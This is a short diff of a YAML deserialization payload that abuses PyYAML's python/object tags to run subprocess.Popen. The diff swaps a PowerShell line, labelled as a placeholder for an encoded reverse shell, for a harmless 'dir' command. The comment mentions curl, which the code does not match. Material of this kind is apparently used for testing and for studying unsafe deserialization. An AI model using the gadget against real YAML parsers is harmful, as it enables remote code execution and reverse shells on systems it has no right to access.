@@ -2,7 +2,7 @@
 # custom `listitems` argument, in this case a simple curl request
 
 - !!python/object/new:yaml.MappingNode
-  listitems: !!str '!!python/object/apply:subprocess.Popen [["powershell", "-e", "reverse shell generator PowerShel b64"]]'
+  listitems: !!str '!!python/object/apply:subprocess.Popen [["powershell", "-Command", "dir"]]'
   state:
     tag: !!str dummy
     value: !!str dummy
